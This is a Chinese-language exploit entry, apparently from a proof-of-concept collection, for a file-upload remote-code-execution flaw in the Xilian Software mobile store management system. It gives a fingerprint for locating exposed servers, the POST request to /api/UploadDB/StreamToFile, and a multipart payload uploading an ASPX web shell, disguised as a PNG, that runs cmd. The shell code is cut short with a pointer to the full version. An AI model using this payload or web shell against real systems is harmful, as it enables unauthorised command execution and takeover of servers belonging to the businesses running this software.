# 西联软件移动门店管理系统StreamToFile存在文件上传致RCE漏洞

- **系统**：西联软件移动门店管理系统　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`body="西联软件提供云计算服务"`
- **请求**：`POST /api/UploadDB/StreamToFile HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlA…`

**请求体 / payload**
```
------WebKitFormBoundaryFfJZ4PlAZBixjELj
Content-Disposition: form-data; name="organ"
qwert
------WebKitFormBoundaryFfJZ4PlAZBixjELj
Content-Disposition: form-data; name="devid"
yuiop
------WebKitFormBoundaryFfJZ4PlAZBixjELj
Content-Disposition: form-data; name="files";filename="1.aspx"
Content-Type: image/png
<%@ Page Language="Jscript" validateRequest="false" %>
<%
var c=new System.Diagnostics.ProcessStartInfo("cmd");
var e=new System.Diagnostics.Process();
var out:System.IO.StreamReader,EI:System.IO.StreamReader;
c.UseShellExecute=false;
c.RedirectStandardOutput=true;
c.RedirectStandardErro…（脚本共 923 字，完整版见原文）
```
- **预期**：201　|　—